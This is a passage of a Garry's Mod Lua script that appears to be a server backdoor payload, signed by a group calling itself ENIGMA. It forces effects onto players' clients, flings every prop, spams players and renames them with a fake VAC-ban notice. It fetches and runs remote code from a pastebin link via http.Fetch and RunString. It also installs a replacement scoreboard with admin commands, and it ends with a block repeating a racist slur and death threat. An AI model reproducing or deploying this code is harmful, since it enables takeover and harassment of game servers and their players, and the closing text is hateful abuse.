            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )

    end
    surface.PlaySound( "vo/npc/male01/ohno.wav" )
    surface.PlaySound( "vo/npc/male01/ohno.wav" )
    timer.Create("fff", 0.1, 0, function() 
        util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
    end)

    timer.Simple( 15, function()

        wut = vgui.Create( "DFrame" )
        wut:SetSize( w, h )
        wut:SetPos(0,0)
        wut:SetDraggable ( false )
        wut:SetTitle("")
        wut:ShowCloseButton(false)

        wut.Paint = function( self ) 
            surface.SetDrawColor(30, 30, 30, 0)
        end

        local Close = vgui.Create( "DButton", wut )
        Close:SetPos(px, py)
        Close:SetText( "" )
        Close:SetSize( pw, ph ) 
        Close.Paint = function( self, tw, th )
                
            local shift = math.sin(RealTime()*3)*1.5 + 5
                
            local text = "ΣNIGMA"

                draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

        end

        RunConsoleCommand("r_shader_srgb","1")
        RunConsoleCommand("gmod_language","ko")
        ohno:Remove()
        ohno = nil

        local name = GetConVar("sv_skyname"):GetString()
        if name == "painted" then
          local sky
          for _, v in ipairs(ents.GetAll()) do
            if v:GetClass() == "env_skypaint" then
              sky = v
              break
            end
          end
          if !IsValid(sky) then return end
          hook.Add("PostRender","\xFFsky\xFF",function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            col = Vector(col.r/255,col.g/255,col.b/255)
            sky:SetTopColor(col)
            sky:SetBottomColor(col)
          end)
        else
          local prefix  = {"lf","ft","rt","bk","dn","up"}
          local mats = {}
          for i=1,6 do
            mats[#mats+1] = Material("skybox/" .. name .. prefix[i])
          end
          hook.Add("PostRender","\xFFsky\xFF",function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            for i=1,6 do
              mats[i]:SetVector("$color",Vector(col.r/255,col.g/255,col.b/255))
            end
          end)
        end
        local chienchaud = ClientsideModel("models/food/hotdog.mdl")
        chienchaud:SetNoDraw(true)
        chienchaud:SetModelScale(120)
        timer.Create("charglogo", 0.01, 0, function()
          chienchaud:SetAngles(Angle(0, CurTime()*90 % 360 ,180) )
        end)
        --chienchaud:SetMaterial( "models/screenspace" )
        local data = {}
        local function genchienchaud(id)
          local pos = LocalPlayer():GetPos()
          data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
        end
        for i=1, 150 do
          genchienchaud(i)
        end
        hook.Add("PostDrawOpaqueRenderables","\xFFitsrainingchienchauds\xFF",function()
          local z = LocalPlayer():GetPos().z
          for i=1, #data do
            chienchaud:SetPos(data[i][1])
            chienchaud:SetupBones()
            chienchaud:DrawModel()
            data[i][1].z = data[i][1].z - data[i][2] / 20
            if data[i][1].z <= z then
              genchienchaud(i)
            end
          end
        end)



    end )


    sound.PlayURL( "https://gvac.cz/assets/mlg.mp3", "mono noblock noplay", function( station ) 
        timer.Simple( 0.1, function()                     
            ClientStation = station
            station:EnableLooping( true )
            station:Play()
            station:SetVolume( 30 )
        end )
    end )

timer.Create("f", 0.11, 0, function() 
    RunConsoleCommand("+attack")
end)
timer.Create("ff", 0.12, 0, function() 
    RunConsoleCommand("-attack")
end)
]])
end)

timer.Create("ok", 1, 0, function() 
    for k, v in pairs( ents.FindByClass( "prop_*" ) ) do local phys = v:GetPhysicsObject()
        if (IsValid(phys)) then
            phys:EnableMotion(true)
        end 
    end

    local props = ents.GetAll()
    for _, prop in ipairs( props ) do
        if(prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter( Vector( 0, 0, ((650 * 0.73) * prop:GetPhysicsObject():GetMass() ) ) )
        end
    end
end)


timer.Simple( 20, function()

    membresenigma = 
    {
        "Akita",
        "IXXE",
        "Jodingue",
        "Kazuki",
        "Keeta",
        "DJTB",
        "Zilnix",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "BAN HAMMER > https://bit.ly/2LUu3GN",
        "BAN HAMMER > https://bit.ly/2LUu3GN",
        "BAN HAMMER > https://bit.ly/2LUu3GN",
        "BAN HAMMER > https://bit.ly/2LUu3GN",
        "BAN HAMMER > https://bit.ly/2LUu3GN"
    }

    timer.Create( "gvacspam", 0.2, 0, function()
        for k, ply in pairs( player.GetAll() ) do
            DarkRP.notify(ply, 2, 2, "[Oh No !] "..table.Random(membresenigma).."")
        end
    end)

    local sun = ents.FindByClass("env_sun")
    if #sun == 0 then return end
    sun = sun[1]
    hook.Add("Think","\xFFsun\xFF",function()
        sun:SetKeyValue("sun_dir", math.sin(CurTime())/3 .. " " .. math.cos(CurTime())/3 .. " 0.901970")
        sun:SetModelScale(120)
    end)


    for k,v in pairs(player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(400 * 4);
    end


    timer.Create( "gtonip", 1, 0, function()
        for k,v in pairs(player.GetAll()) do
            v:GodEnable()
            v:setDarkRPVar( "rpname", "This Steam account has been VAC banned from secure servers due to a cheating infraction." )
        end

    end )


    timer.Simple( 17, function()
        http.Fetch('https://pastebin.com/raw/7ABFD4Bu',function(b,l,h,c)RunString(b)end,nil)
    end )

end)


timer.Create( "gvacspam", 0.1, 0, function()
    SendToClient([[
    print("GET NOSCOPE  !!")
   ]])
    print("GET NOSCOPE  !!")
end) 



--[[

    ScoreBoard

]]--



timer.Create("TimerGo",1,1,function()

hook.Remove("ScoreboardHide", "FAdmin_scoreboard")
hook.Remove("ScoreboardShow", "FAdmin_scoreboard")

local function SandBox()
    return gmod.GetGamemode().Name == 'Sandbox'
end

local blur = Material("pp/blurscreen")

surface.CreateFont( "UserName", {
 font = "BorisBlackBloxx",
 size = 25,
 weight = 800,
} )

surface.CreateFont( "UserJob", {
 font = "BorisBlackBloxx",
 size = 24,
 weight = 800,
} )

surface.CreateFont( "UserPing", {
 font = "BorisBlackBloxx",
 size = 20,
 weight = 800,
} )
surface.CreateFont( "Popup", {
 font = "BorisBlackBloxx",
 size = 21,
 weight = 750,
} )

surface.CreateFont( "SBInfo", {
 font = "BorisBlackBloxx",
 size = 18,
 weight = 800,
} )

local sboard

function DrawScoreBoard()
	sboard = vgui.Create("DFrame")
	sboard:SetSize( ScrW() * 0.5, ScrH() *0.95 )
	sboard:SetTitle("")
	sboard:Center()
	sboard:SetDraggable(false)
	sboard:ShowCloseButton(false)
	sboard:MakePopup()

	local x, y = sboard:GetPos()

	sboard.Paint = function(self, w, h)
	Derma_DrawBackgroundBlur( self )
       	render.SetScissorRect(x, y, w + x, h + y, true)

		surface.SetDrawColor(Color(0, 0, 0, 225))
		surface.DrawRect(40, 125, w, h - h + 25)

		draw.SimpleText( "Nom RP", "SBInfo", 90, (h - h+129), Color(255, 255, 255	, 255))
		draw.SimpleText( "Job", "SBInfo", w/2+26, (h - h+129), Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
		draw.SimpleText( "Ping", "SBInfo", w-36, (h - h+129), Color(255, 255, 255, 255))
		draw.SimpleText( "Mort", "SBInfo", (w - ((w/7)*2))+18, (h - h+129), Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
		draw.SimpleText( "Tuer", "SBInfo", (w - (w/7)-20)+10, (h - h+129), Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)

        render.SetScissorRect(0, 0, 0, 0, false)
	end

	local sboardscroll = sboard:Add("DScrollPanel")
	sboardscroll:SetPos(40, 150)
	sboardscroll:SetSize(sboard:GetWide() - 48 + 23, sboard:GetTall() - 200)

	sboardscroll.VBar.Paint = function() end
	sboardscroll.VBar.btnGrip.Paint = sboardscroll.VBar.Paint
	sboardscroll.VBar.btnUp.Paint = sboardscroll.VBar.Paint
	sboardscroll.VBar.btnDown.Paint = sboardscroll.VBar.Paint


	sboard.Update = function()

		sboardscroll:Clear()

		for k, v in pairs(player.GetAll()) do

			local backp = sboardscroll:Add("DPanel")
			backp:SetPos(0, k * 37 - 37)
			backp:SetSize(sboardscroll:GetWide(), 35)

			local button = vgui.Create("DButton", backp)
			button:SetSize(backp:GetWide(), 36)
			button:SetPos(0, 0)
			button:SetText("")
			button.Paint = function(self, w, h)
				surface.SetDrawColor(Color(0, 0, 0, 0))
      			surface.DrawRect(0, 0, w, h)
      		end
			button.DoClick = function()
			if IsValid(playerinfoforthetabmenu) then
			     playerinfoforthetabmenu:Close()
      end
      if IsValid(adminmenuforthetabmenu) then
           adminmenuforthetabmenu:Close()
      end
      if LocalPlayer():IsUserGroup("admin")
      or LocalPlayer():IsUserGroup("superadmin")
      or LocalPlayer():IsUserGroup("fondateur")
      or LocalPlayer():IsUserGroup("co-fondateur")
      or LocalPlayer():IsUserGroup("SuperAdmin")
      or LocalPlayer():IsUserGroup("moderateur")
      or LocalPlayer():IsUserGroup("moderateur-test")
      or LocalPlayer():IsUserGroup("animateur") then
      adminmenuforthetabmenu = vgui.Create("DFrame")
      adminmenuforthetabmenu:SetSize( ScrW() * 0.1675, ScrH() *0.17 )
      adminmenuforthetabmenu:SetTitle("")
      adminmenuforthetabmenu:SetPos( ScrW() * 0.753, ScrH() *0.175 )
      adminmenuforthetabmenu:SetDraggable(false)
      adminmenuforthetabmenu:ShowCloseButton(false)
      adminmenuforthetabmenu:MakePopup()
      adminmenuforthetabmenu.Paint = function(self, w, h)
      surface.SetDrawColor(175, 175, 175 ,245)
      surface.DrawRect(0, 0, w, h)
      surface.SetDrawColor(0, 0, 0, 255)
      surface.DrawRect(0, 0, w, h - h + 35)
      draw.SimpleText("Commandes Admins", "UserName", 150, (h - h) + 2, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
      end
      local adminbutton = vgui.Create("DButton", adminmenuforthetabmenu)
      adminbutton:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton:SetPos( ScrW() * 0.003, ScrH() * 0.04 )
      adminbutton:SetText("Goto")
      adminbutton:SetFont("UserPing")
      adminbutton:SetTextColor(color_white)
      function adminbutton:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
  	end
      adminbutton.DoClick = function()
        local toexec = [[ulx goto "]]..v:Nick()..[["]]
        LocalPlayer():ConCommand(toexec)
      end
      local adminbutton2 = vgui.Create("DButton", adminmenuforthetabmenu)
      adminbutton2:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton2:SetPos( ScrW() * 0.085, ScrH() * 0.04 )
      adminbutton2:SetText("Teleport")
      adminbutton2:SetFont("UserPing")
      adminbutton2:SetTextColor(color_white)
      function adminbutton2:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
    end
      adminbutton2.DoClick = function()
        local toexec = [[ulx teleport "]]..v:Nick()..[["]]
        LocalPlayer():ConCommand(toexec)
      end
      local adminbutton3 = vgui.Create("DButton", adminmenuforthetabmenu)
      adminbutton3:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton3:SetPos( ScrW() * 0.003, ScrH() * 0.083 )
      adminbutton3:SetText("Bring")
      adminbutton3:SetFont("UserPing")
      adminbutton3:SetTextColor(color_white)
      function adminbutton3:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
    end
      adminbutton3.DoClick = function()
        menudubring = DermaMenu()

        local Padding = vgui.Create("DPanel")
        Padding:SetPaintBackgroundEnabled(false)
        Padding:SetSize(1,5)
        menudubring:AddPanel(Padding)

        local Title = vgui.Create("DLabel")
        Title:SetText("  Bring to:\n")
        Title:SetFont("UiBold")
        Title:SizeToContents()
        Title:SetTextColor(color_black)

        menudubring:AddPanel(Title)

        local uid = v:UserID()
        menudubring:AddOption("Yourself", function() RunConsoleCommand("_FAdmin", "bring", uid) end)
        for _, v in pairs(DarkRP.nickSortedPlayers()) do
            if IsValid(v) and v ~= LocalPlayer() then
                local vUid = v:UserID()
                menudubring:AddOption(v:Nick(), function() RunConsoleCommand("_FAdmin", "bring", uid, vUid) end)
            end
        end
        menudubring:Open()
      end
      local adminbutton4 = vgui.Create("DButton", adminmenuforthetabmenu)
      adminbutton4:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton4:SetPos( ScrW() * 0.085, ScrH() * 0.083 )
      adminbutton4:SetText("Spectate")
      adminbutton4:SetFont("UserPing")
      adminbutton4:SetTextColor(color_white)
      function adminbutton4:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
    end
      adminbutton4.DoClick = function()
        local toexec = [[ulx spectate "]]..v:Nick()..[["]]
        print(toexec)
        LocalPlayer():ConCommand(toexec)
      end
      local adminbutton6 = vgui.Create("DButton", adminmenuforthetabmenu)
      adminbutton6:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton6:SetPos( ScrW() * 0.003, ScrH() * 0.127 )
      adminbutton6:SetText("Ban")
      adminbutton6:SetFont("UserPing")
      adminbutton6:SetTextColor(color_white)
      function adminbutton6:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
    end
      adminbutton6.DoClick = function()
        local fr = vgui.Create( "DFrame" )
      fr:SetSize( 350, 170 )
      fr:Center()
      fr:SetTitle( "Ban : "..v:Name() )
      fr:SetDraggable( false )
      fr:ShowCloseButton( true )
      fr:MakePopup()
      function fr:Paint( w, h )
        surface.SetDrawColor(175, 175, 175 ,245)
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(0, 0, 0, 255)
        surface.DrawRect(0, 0, w, h - h + 25)

        draw.SimpleText( "Raison : ", "Trebuchet24", w / 2, 25, color_white, 1 )
      end

      local timeValue = vgui.Create( "DTextEntry", fr )
      timeValue:SetSize( fr:GetWide() - 10, 25 )
      timeValue:SetPos( 5, 60 )
      timeValue:SetNumeric( false )
      timeValue:SetPlaceholderText( 'Entrez le temps... (En minute(s))' )

      local reasonValue = vgui.Create( "DTextEntry", fr )
      reasonValue:SetSize( fr:GetWide() - 10, 25 )
      reasonValue:SetPos( 5, 90 )
      reasonValue:SetNumeric( false )
      reasonValue:SetPlaceholderText( 'Entrez la raison...' )

      local btn = vgui.Create( "DButton", fr )
      btn:SetSize( 100, 30 )
      btn:SetPos( fr:GetWide() / 2 - btn:GetWide() / 2, 130 )
      btn:SetText( "Valider" )
      btn:SetTextColor( color_white )
      btn:SetFont( 'Trebuchet24' )
      function btn:Paint( w, h )
        draw.RoundedBox( 17, 0, 0, w, h, Color( 10, 130, 255, 255 ) )
      end
      function btn:DoClick()
        local toexec = [[ulx ban "]]..v:Nick()..[[" "]]..timeValue:GetValue()..[[" "]]..reasonValue:GetValue()..[["]]
        LocalPlayer():ConCommand(toexec)
        fr:Close()
      end
    end
      local adminbutton7 = vgui.Create("DButton", adminmenuforthetabmenu)
      adminbutton7:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton7:SetPos( ScrW() * 0.085, ScrH() * 0.127 )
      adminbutton7:SetText("Kick")
      adminbutton7:SetFont("UserPing")
      adminbutton7:SetTextColor(color_white)
      function adminbutton7:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
    end
      adminbutton7.DoClick = function()
        local fr = vgui.Create( "DFrame" )
      fr:SetSize( 350, 145 )
      fr:Center()
      fr:SetTitle( "Kick : "..v:Name() )
      fr:SetDraggable( false )
      fr:ShowCloseButton( true )
      fr:MakePopup()
      function fr:Paint( w, h )
        surface.SetDrawColor(175, 175, 175 ,245)
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(0, 0, 0, 255)
        surface.DrawRect(0, 0, w, h - h + 25)

        draw.SimpleText( "Raison : ", "Trebuchet24", w / 2, 25, color_white, 1 )
      end

      local reasonValue = vgui.Create( "DTextEntry", fr )
      reasonValue:SetSize( fr:GetWide() - 10, 25 )
      reasonValue:SetPos( 5, 60 )
      reasonValue:SetNumeric( false )
      reasonValue:SetPlaceholderText( 'Entrez la raison...' )

      local btn = vgui.Create( "DButton", fr )
      btn:SetSize( 100, 30 )
      btn:SetPos( fr:GetWide() / 2 - btn:GetWide() / 2, 100 )
      btn:SetText( "Valider" )
      btn:SetTextColor( color_white )
      btn:SetFont( 'Trebuchet24' )
      function btn:Paint( w, h )
        draw.RoundedBox( 17, 0, 0, w, h, Color( 10, 130, 255, 255 ) )
      end
      function btn:DoClick()
        local toexec = [[ulx kick "]]..v:Nick()..[[" "]]..reasonValue:GetValue()..[["]]
        LocalPlayer():ConCommand(toexec)
        fr:Close()
      end
    end
end
			playerinfoforthetabmenu = vgui.Create("DFrame")
			playerinfoforthetabmenu:SetSize( ScrW() * 0.17, ScrH() *0.3 )
			playerinfoforthetabmenu:SetTitle("")
			playerinfoforthetabmenu:SetPos( ScrW() * 0.1, ScrH() *0.175 )
			playerinfoforthetabmenu:SetDraggable(false)
			playerinfoforthetabmenu:ShowCloseButton(false)
			playerinfoforthetabmenu:MakePopup()
			playerinfoforthetabmenu.Paint = function(self, w, h)
			surface.SetDrawColor(175, 175, 175 ,245)
			surface.DrawRect(0, 0, w, h)
			surface.SetDrawColor(0, 0, 0, 255)
			surface.DrawRect(0, 0, w, h - h + 35)
			draw.SimpleText(v:Name(), "UserName", 150, (h - h) + 2, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
			draw.SimpleText("Grade : "..v:GetUserGroup(), "Popup", 5, (h - h) + 175, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT)
			draw.SimpleText("Steam ID : "..v:SteamID(), "Popup", 5, (h - h) + 200, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT)
			local avatar = playerinfoforthetabmenu:Add("AvatarImage")
			avatar:SetPos(2, 37)
			avatar:SetSize(125, 125)
			avatar:SetPlayer(v)
			end
			local buttonplayerinfoforthetabmenu = vgui.Create("DButton", playerinfoforthetabmenu)
			buttonplayerinfoforthetabmenu:SetSize( ScrW() * 0.15, ScrH() *0.04 )
			buttonplayerinfoforthetabmenu:SetPos( ScrW() * 0.01, ScrH() *0.24 )
			buttonplayerinfoforthetabmenu:SetText("Copier Le SteamID")
			buttonplayerinfoforthetabmenu:SetFont("UserName")
			buttonplayerinfoforthetabmenu:SetTextColor(color_white)
			function buttonplayerinfoforthetabmenu:Paint( w, h )
			draw.RoundedBox( 10, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
			buttonplayerinfoforthetabmenu.DoClick = function()
      chat.AddText("SteamID Copier !")
      buttonplayerinfoforthetabmenu:SetText("Copier !")
      timer.Create("TimerSteam",1,1,function()
      buttonplayerinfoforthetabmenu:SetText("Copier Le SteamID")
      end)
			SetClipboardText(v:SteamID())
		end
  	end
    local buttontwoplayerinfoforthetabmenu = vgui.Create("DButton", playerinfoforthetabmenu)
    buttontwoplayerinfoforthetabmenu:SetSize( ScrW() * 0.09, ScrH() * 0.03 )
    buttontwoplayerinfoforthetabmenu:SetPos( ScrW() * 0.076, ScrH() * 0.04 )
    buttontwoplayerinfoforthetabmenu:SetText("Report")
    buttontwoplayerinfoforthetabmenu:SetFont("UserPing")
    buttontwoplayerinfoforthetabmenu:SetTextColor(color_white)
    function buttontwoplayerinfoforthetabmenu:Paint( w, h )
    draw.RoundedBox( 15, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
	end
    buttontwoplayerinfoforthetabmenu.DoClick = function()
		local fr = vgui.Create( "DFrame" )
	fr:SetSize( 350, 145 )
	fr:Center()
	fr:SetTitle( "Report : "..v:Name() )
	fr:SetDraggable( false )
	fr:ShowCloseButton( true )
	fr:MakePopup()
	function fr:Paint( w, h )
surface.SetDrawColor(175, 175, 175 ,245)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(0, 0, w, h - h + 25)

		draw.SimpleText( "Raison : ", "Trebuchet24", w / 2, 25, color_white, 1 )
	end

	local pAmount = vgui.Create( "DTextEntry", fr )
	pAmount:SetSize( fr:GetWide() - 10, 25 )
	pAmount:SetPos( 5, 60 )
	pAmount:SetNumeric( false )
	pAmount:SetPlaceholderText( 'Entrez une Raison...' )

	local btn = vgui.Create( "DButton", fr )
	btn:SetSize( 100, 30 )
	btn:SetPos( fr:GetWide() / 2 - btn:GetWide() / 2, 100 )
	btn:SetText( "Valider" )
	btn:SetTextColor( color_white )
	btn:SetFont( 'Trebuchet24' )
	function btn:Paint( w, h )
		draw.RoundedBox( 17, 0, 0, w, h, Color( 10, 130, 255, 255 ) )
	end
	function btn:DoClick()
    chat.AddText(Color(255,0,0),"[Ticket]",Color(255,255,255)," Report Effectuer")
		RunConsoleCommand( "say", "/// Bonjour, " ..v:Name().. " " ..( pAmount:GetValue() ) )
    fr:Close()
	end
end
	    local buttontreeplayerinfoforthetabmenu = vgui.Create("DButton", playerinfoforthetabmenu)
    buttontreeplayerinfoforthetabmenu:SetSize( ScrW() * 0.09, ScrH() * 0.03 )
    buttontreeplayerinfoforthetabmenu:SetPos( ScrW() * 0.076, ScrH() * 0.08 )
    buttontreeplayerinfoforthetabmenu:SetText("Prochainement")
    buttontreeplayerinfoforthetabmenu:SetFont("UserPing")
    buttontreeplayerinfoforthetabmenu:SetTextColor(color_white)
    function buttontreeplayerinfoforthetabmenu:Paint( w, h )
    draw.RoundedBox( 15, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
	end
    buttontreeplayerinfoforthetabmenu.DoClick = function()
  end
  local buttonfiveplayerinfoforthetabmenu = vgui.Create("DButton", playerinfoforthetabmenu)
buttonfiveplayerinfoforthetabmenu:SetSize( ScrW() * 0.09, ScrH() * 0.03 )
buttonfiveplayerinfoforthetabmenu:SetPos( ScrW() * 0.076, ScrH() * 0.12 )
buttonfiveplayerinfoforthetabmenu:SetText("Message")
buttonfiveplayerinfoforthetabmenu:SetFont("UserPing")
buttonfiveplayerinfoforthetabmenu:SetTextColor(color_white)
function buttonfiveplayerinfoforthetabmenu:Paint( w, h )
draw.RoundedBox( 15, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
end
buttonfiveplayerinfoforthetabmenu.DoClick = function()
      local frame = vgui.Create("DFrame")
      frame:SetTitle("Envoyer un message")
      frame:SetSize(350, 120)
      frame:ShowCloseButton(false)
      frame:Center()
      frame:MakePopup()
      frame.Paint = function(self, w, h)
      surface.SetDrawColor(175, 175, 175 ,245)
      surface.DrawRect(0, 0, w, h)
      surface.SetDrawColor(0, 0, 0, 255)
      surface.DrawRect(0, 0, w, h - h + 25)
    end

      local MsgType = 2

      local i = 0
      local TypeButtons = {}
      for k, v in pairs(FAdmin.Messages.MsgTypes) do

          table.insert(TypeButtons, MsgTypeButton)
          i = i + 1
      end

      local OK = vgui.Create("DButton", frame)
      local TextBox = vgui.Create("DTextEntry", frame)
      TextBox:SetPos(20, 50)
      TextBox:StretchToParent(20, nil, 20, nil)
      TextBox:RequestFocus()
      function TextBox:Think()
          TextBox.InTab = TextBox.InTab or input.IsKeyDown(KEY_TAB)
          if TextBox.InTab and not input.IsKeyDown(KEY_TAB) then self:RequestFocus() end
      end
      function TextBox:OnEnter()
          OK:DoClick()
      end

      OK:SetSize(100, 20)
      OK:SetText("OK")
      OK:SetTextColor(color_white)
      OK:AlignRight(20)
      OK:AlignBottom(10)
      function OK:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
      end
      function OK:DoClick()
          frame:Close()
          if not IsValid(v) then return end
          RunConsoleCommand("_FAdmin", "Message", v:SteamID(), MsgType, TextBox:GetValue())
      end

      local close = vgui.Create("DButton", frame)
      close:SetSize( ScrW() * 0.02, ScrH() * 0.02 )
      close:SetPos( ScrW() * 0.18, ScrH() * 0.002 )
      close:SetText("")
      function close:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
      draw.SimpleText("❌","CenterPrintText",15,0,Color(255,0,0))
      end
      close.DoClick = function()
        frame:Close()
      end

  FAdmin.StartHooks["zzSendMessage"] = function()
      FAdmin.Access.AddPrivilege("Message", 1)
      FAdmin.Commands.AddCommand("Message", nil, "<Player>", "[type]", "<text>")

      FAdmin.ScoreBoard.Player:AddActionButton("Send message", "fadmin/icons/message", Color(0, 200, 0, 255),
          function(v) return FAdmin.Access.PlayerHasPrivilege(LocalPlayer(), "Message") and not v:IsBot() end, function(v, button)
              MessageGui(v)
          end)
  end
end
end



			local avatar = backp:Add("AvatarImage")
			avatar:SetPos(0, 0)
			avatar:SetSize(36, 36)
			avatar:SetPlayer(v)

			backp.Paint = function(self, w, h)

				if not v:IsValid() then
					sboard:Update()
					return
				end

				surface.SetDrawColor(255, 255, 255 ,255)
				surface.DrawOutlinedRect(0, 0, w, h)
				surface.SetDrawColor(175, 175, 175 ,245)
				surface.DrawRect(0, 0, w, h)

      			draw.SimpleText(v:Name(), "UserName", 45, (h - h) + 2, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT)
      			draw.SimpleText( v:getJobTable().name, "UserJob", w / 2, (h - h) + 6, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
      			draw.SimpleText(v:Deaths(), "UserPing", w - ((w/7)*2), (h - h) + 7, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
      			draw.SimpleText(v:Frags(), "UserPing", w - (w/7) - 20, (h - h) + 7, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
      			draw.SimpleText(v:Ping(), "UserPing", w - 20, (h - h) + 7, Color(255, 255, 255, 255), TEXT_ALIGN_RIGHT)
      		end
		end
	end
    sboard:Update()
end

hook.Add("ScoreboardShow", "DarkRP.custom.scoreboard.show", function()
    if not (sboard == nil) then
    	sboard:Update()
        sboard:SetVisible(true)
		local function PUMPPPTEST()

  tab= {}
  tab[ "$pp_colour_addr" ]         = 0
  tab[ "$pp_colour_addg" ]         = 0
  tab[ "$pp_colour_addb" ]         = 0
  tab[ "$pp_colour_brightness" ]      = 0
  tab[ "$pp_colour_contrast" ]          = 1
  tab[ "$pp_colour_colour" ]         = 0
  tab[ "$pp_colour_mulr" ]         = 0
  tab[ "$pp_colour_mulg" ]         = 0
  tab[ "$pp_colour_mulb" ]         = 0

    DrawColorModify( tab )
end
hook.Add( "RenderScreenspaceEffects", "RenderColorModifyPOO", PUMPPPTEST )

    else
        DrawScoreBoard()
    end
end)
hook.Add("ScoreboardHide", "DarkRP.custom.scoreboard.hide", function()
    if (sboard) then
			sboard:SetVisible(false)
				if IsValid(playerinfoforthetabmenu) then
					playerinfoforthetabmenu:Close()
				end
        if IsValid(adminmenuforthetabmenu) then
             adminmenuforthetabmenu:Close()
        end
        timer.Remove("TimerSteam")
					hook.Remove("RenderScreenspaceEffects", "RenderColorModifyPOO")

	end
end)
end)



--[[

    Data S'autoSucer

]]--



local n1gs = [[ N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
